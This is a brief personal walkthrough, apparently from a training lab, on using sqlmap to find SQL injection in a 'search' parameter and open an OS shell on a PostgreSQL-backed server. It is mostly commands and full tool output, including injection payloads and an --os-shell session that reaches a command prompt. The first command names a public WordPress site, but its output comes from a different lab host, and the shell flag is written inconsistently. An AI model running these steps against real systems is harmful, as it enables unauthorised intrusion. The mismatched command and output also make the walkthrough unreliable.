# SQLMAP HOW TO
This is to show how to use SQL MAP

It requires the url and the cookie. Use cookie editor plug-in to find the cookie.

Command
```bash
sqlmap -u 'https://mickmccarty.com/wp-login.php' --cookie="wordpress_test_cookie=WP%20Cookie%20check"
```

Result
```        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.7#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:30:38 /2022-09-27/

[18:30:38] [INFO] testing connection to the target URL
[18:30:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:30:38] [INFO] testing if the target URL content is stable
[18:30:38] [INFO] target URL content is stable
[18:30:38] [INFO] testing if GET parameter 'search' is dynamic
[18:30:38] [WARNING] GET parameter 'search' does not appear to be dynamic
[18:30:39] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[18:30:39] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
[18:30:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:31:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:31:00] [INFO] testing 'Generic inline queries'
[18:31:00] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:31:00] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
[18:31:00] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:31:00] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[18:31:00] [INFO] testing 'PostgreSQL inline queries'
[18:31:00] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:31:00] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)
[18:31:11] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[18:31:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:31:21] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[18:31:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=any query' AND (SELECT (CASE WHEN (8985=8985) THEN NULL ELSE CAST((CHR(111)||CHR(73)||CHR(100)||CHR(98)) AS NUMERIC) END)) IS NULL-- HRtV

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=any query' AND 5276=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5276=5276) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(112)||CHR(113)) AS NUMERIC)-- LMgD

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=any query' AND 4021=(SELECT 4021 FROM PG_SLEEP(5))-- akZU
---
[18:31:44] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[18:31:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.239.5'

[*] ending @ 18:31:44 /2022-09-27/



```

Tool confirmed that is is vulnerable to SQL injection

Attempt to get a shell with ```--os-shell``` flag.

Command
```bash
sqlmap -u 'http://10.129.239.5/dashboard.php?search=any+query' --cookie="PHPSESSID=1a5mp168lht1niqkdrjh277q48" -os-shell
```

Result
```
        ___
       __H__                                                                                                                                       
 ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                                                           
|_ -| . ["]     | .'| . |                                                                                                                          
|___|_  [.]_|_|_|__,|  _|                                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:37:25 /2022-09-27/

[18:37:25] [INFO] resuming back-end DBMS 'postgresql' 
[18:37:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=any query' AND (SELECT (CASE WHEN (8985=8985) THEN NULL ELSE CAST((CHR(111)||CHR(73)||CHR(100)||CHR(98)) AS NUMERIC) END)) IS NULL-- HRtV

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=any query' AND 5276=CAST((CHR(113)||CHR(122)||CHR(98)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (5276=5276) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(112)||CHR(113)) AS NUMERIC)-- LMgD

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=any query';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=any query' AND 4021=(SELECT 4021 FROM PG_SLEEP(5))-- akZU
---
[18:37:26] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[18:37:26] [INFO] fingerprinting the back-end DBMS operating system
[18:37:27] [INFO] the back-end DBMS operating system is Linux
[18:37:27] [INFO] testing if current user is DBA
[18:37:28] [INFO] retrieved: '1'
[18:37:28] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[18:37:28] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 

```

Obtained unstable shell

## TAGS
#sqlmap